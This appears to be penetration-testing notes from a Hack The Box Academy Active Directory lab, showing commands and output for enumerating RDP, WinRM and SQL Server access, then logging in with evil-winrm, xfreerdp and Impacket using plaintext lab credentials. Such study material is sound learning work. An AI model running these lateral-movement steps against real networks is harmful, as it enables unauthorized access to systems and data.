# Privileged Access

## Enumerating Remote Desktop Users

```pwsh
PS C:\Users\htb-student> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
```

```output title="Output" hl_lines="1 3"
ComputerName : ACADEMY-EA-MS01
GroupName    : Remote Desktop Users
MemberName   : INLANEFREIGHT\Domain Users
SID          : S-1-5-21-3842939050-3880317879-2865463114-513
IsGroup      : True
IsDomain     : UNKNOWN
```

## RDP

=== "MSTSC"

    ```pwsh
    PS C:\Users\htb-student> C:\Windows\System32\mstsc.exe
    ```

=== "XFREERDP"

    ```sh
    htb-student@ea-attack01:~$ xfreerdp /v:172.16.5.25 /u:'forend' /p:'Klmcargo2' /drive:linux,/tmp
    ```

## Enumerating Remote Management Users

```pwsh
PS C:\Users\htb-student> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
```

```output title="Output" hl_lines="1 3"
ComputerName : ACADEMY-EA-MS01
GroupName    : Remote Management Users
MemberName   : INLANEFREIGHT\forend
SID          : S-1-5-21-3842939050-3880317879-2865463114-5614
IsGroup      : False
IsDomain     : UNKNOWN
```

## WinRM

=== "POWERSHELL"

    ```pwsh
    PS C:\Users\htb-student> Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential (New-Object System.Management.Automation.PSCredential("INLANEFREIGHT\forend", (ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force)))
    ```

=== "EVIL-WINRM"

    ```sh
    htb-student@ea-attack01:~$ evil-winrm -i 172.16.5.25 -u 'forend' -p 'Klmcargo2'
    ```

## [Discovering AD Domain SQL Server Instances](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet)

```pwsh
PS C:\Users\htb-student> Import-Module .\PowerUpSQL.ps1
PS C:\Users\htb-student> Get-SQLInstanceDomain
```

```output title="Output" hl_lines="1 4"
ComputerName     : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL
Instance         : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL,1433
DomainAccountSid : 1500000521000170152142291832437223174127203170152400
DomainAccount    : damundsen
DomainAccountCn  : Dana Amundsen
Service          : MSSQLSvc
Spn              : MSSQLSvc/ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL:1433
LastLogon        : 4/10/2022 3:50 PM
Description      :

ComputerName     : ACADEMY-EA-FILE
Instance         : MSSQL/ACADEMY-EA-FILE
DomainAccountSid : 1500000521000170152142291832437223174127203170152400
DomainAccount    : damundsen
DomainAccountCn  : Dana Amundsen
Service          : MSSQL
Spn              : MSSQL/ACADEMY-EA-FILE
LastLogon        : 4/10/2022 3:50 PM
Description      :

ComputerName     : DEV-PRE-SQL.inlanefreight.local
Instance         : DEV-PRE-SQL.inlanefreight.local,1433
DomainAccountSid : 15000005210001701521422918324372231741272031701232000
DomainAccount    : sqldev
DomainAccountCn  : sqldev
Service          : MSSQLSvc
Spn              : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
LastLogon        : 12/31/1600 4:00 PM
Description      :

ComputerName     : SPSJDB.inlanefreight.local
Instance         : SPSJDB.inlanefreight.local,1433
DomainAccountSid : 15000005210001701521422918324372231741272031701212000
DomainAccount    : sqlprod
DomainAccountCn  : sqlprod
Service          : MSSQLSvc
Spn              : MSSQLSvc/SPSJDB.inlanefreight.local:1433
LastLogon        : 12/31/1600 4:00 PM
Description      :

ComputerName     : SQL-CL01-01inlanefreight.local
Instance         : SQL-CL01-01inlanefreight.local,49351
DomainAccountSid : 15000005210001701521422918324372231741272031701222000
DomainAccount    : sqlqa
DomainAccountCn  : sqlqa
Service          : MSSQLSvc
Spn              : MSSQLSvc/SQL-CL01-01inlanefreight.local:49351
LastLogon        : 12/31/1600 4:00 PM
Description      :
```

## MSSQL

=== "POWERUPSQL"

    ```pwsh
    PS C:\Users\htb-student> Get-SQLQuery -Instance "172.16.5.150,1433" -Username "INLANEFREIGHT\damundsen" -Password "Str0ngpass86!" -Query "SELECT @@version" -Verbose
    ```

=== "IMPACKET"

    ```sh
    htb-student@ea-attack01:~$ mssqlclient.py 'INLANEFREIGHT'/'damundsen':'Str0ngpass86!'@172.16.5.150 -port 1433 -windows-auth
    ```
